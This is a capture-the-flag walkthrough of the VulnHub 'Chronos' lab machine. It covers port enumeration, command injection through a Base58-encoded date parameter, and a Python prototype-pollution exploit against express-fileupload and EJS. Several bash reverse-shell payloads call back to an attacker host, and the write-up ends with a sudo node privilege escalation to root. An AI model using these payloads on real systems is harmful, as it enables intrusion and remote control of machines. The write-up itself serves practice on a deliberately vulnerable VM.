# Chronos

![image](https://user-images.githubusercontent.com/5285547/129067750-516ca744-9b4c-4347-982f-5d4a36e431e9.png)

Room link: https://www.vulnhub.com/entry/chronos-1,735/

## Enum

Nmap 

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```


# Port 80

Nothing much on the home page, refreshing and checking in the dev networks tools shows a strage url request

![image](https://user-images.githubusercontent.com/5285547/129068515-2591006b-ed4a-411c-99f3-540e35be3aef.png)


```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

Add chronos.local to /etc/hosts file

Now on the page we see the result. 

![image](https://user-images.githubusercontent.com/5285547/129071126-5810cb0f-273c-473e-a8de-a117fc8b32d9.png)

Checking the encoding, it turns out its Base58

![image](https://user-images.githubusercontent.com/5285547/129075155-f2d4cab2-28b4-4fa5-94e0-bb741ec74391.png)

![image](https://user-images.githubusercontent.com/5285547/129083902-4b104c8a-ba76-4b90-9a19-8ddf1f623217.png)

Next was to get a reverse shell. 

```
# payload
;bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1";
```

![image](https://user-images.githubusercontent.com/5285547/129084566-7f38c45b-3083-47b7-b3c5-667bcac3b5e2.png)

Finding another webservice on 127.0.0.1:8080, I checked the system for the files. 

```
www-data@chronos:/opt/chronos-v2/backend$ pwd
/opt/chronos-v2/backend
```
```
www-data@chronos:/opt/chronos-v2/backend$ cat server.js 
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
   console.log('Server listening on ' + addr + ' port ' + port);
});
```

cat package.json

```
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",                                                                                                                                                                                                                              
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}
```

This article helps top explain the node express fileupload vuln: https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325

---
## User

Change to the /tmp directory and make a reverse shell as per the article before. 

nano rev.py

```
### imports
import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/192.168.1.96/8888 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName':(None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://127.0.0.1:8080')
print("Finished!")

```

![image](https://user-images.githubusercontent.com/5285547/129087625-827dd813-5488-4481-9600-0c0f9db3f8df.png)

Now we are imera and can get the user flag. 

![image](https://user-images.githubusercontent.com/5285547/129087862-95ebfe9a-7cd0-40ff-a385-48a67148b438.png)


## Root

Checking gtfo bins fdor node, I tested this payload to get root instantly. 

![image](https://user-images.githubusercontent.com/5285547/129088353-2c4463c3-4af8-4d96-8d31-dab3899245e0.png)

```
sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

![image](https://user-images.githubusercontent.com/5285547/129088291-8dc411eb-f403-43e1-8941-d308a0008c2d.png)
